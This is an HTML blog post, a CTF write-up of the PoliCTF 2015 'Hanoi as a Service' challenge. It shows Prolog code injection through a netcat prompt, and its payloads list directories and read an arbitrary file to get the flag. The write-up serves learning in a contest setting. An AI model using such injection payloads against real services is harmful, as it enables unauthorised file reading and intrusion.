@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PoliCTF 2015 - Hanoi as a Service - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG. We&rsquo;re given nc haas.polictf.it 80 as point of attack &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PoliCTF 2015 - Hanoi as a Service</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-12T16:30:31+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:30 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>
+</span><span class='line'>ERROR: Prolog initialisation failed:
+</span><span class='line'>ERROR: Syntax error: Unexpected end of clause
+</span><span class='line'>ERROR: hanoi<span class="o">()</span>
+</span><span class='line'>ERROR: ** here **
+</span><span class='line'>ERROR: .
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>0<span class="o">)</span>, hanoi<span class="o">(</span>2<span class="o">)</span>.
+</span><span class='line'>* Move top disk from a to c
+</span><span class='line'>* Move top disk from a to b
+</span><span class='line'>* Move top disk from c to b
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
+</span><span class='line'><span class="o">[</span>/home/ctf,/home/ubuntu<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># enumerate /home/ctf:</span>
+</span><span class='line'>
+</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>. %
+</span><span class='line'><span class="o">[</span>/home/ctf/haas<span class="o">]</span>bas@tritonal:~<span class="nv">$ </span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># enumerate /home/ctf/haas:</span>
+</span><span class='line'>
+</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
+</span><span class='line'><span class="o">[</span>/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
+</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
+</span><span class='line'>How many disks does your tower have?
+</span><span class='line'>0<span class="o">)</span>, open<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/jhknsjdfhef_flag_here&#39;</span>, <span class="nb">read</span>, S<span class="o">)</span>, read_line_to_codes<span class="o">(</span>S, T<span class="o">)</span>, write<span class="o">(</span>T<span class="o">)</span>.
+</span><span class='line'><span class="o">[</span>102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Back to python!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">102</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">125</span><span class="p">]</span>
+</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">])</span>
+</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">Pr0gramm1ng_in_l0g1c_1s_c00l</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>50 points and first blood for Team Vulnhub.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-07-12T16:30:31+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:30 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/07/12/polictf-2015-crack-me-if-you-can/" title="Previous Post: PoliCTF 2015 - Crack Me If You Can">&laquo; PoliCTF 2015 - Crack Me If You Can</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/07/12/polictf-2015-johns-library/" title="Next Post: PoliCTF 2015 - John's Library">PoliCTF 2015 - John&#8217;s Library &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-johns-shuffle/">PoliCTF 2015 - John&#8217;s Shuffle</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-johns-library/">PoliCTF 2015 - John&#8217;s Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-hanoi-as-a-service/">PoliCTF 2015 - Hanoi as a Service</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-crack-me-if-you-can/">PoliCTF 2015 - Crack Me if You Can</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-john-the-dropper/">PoliCTF 2015 - John the Dropper</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
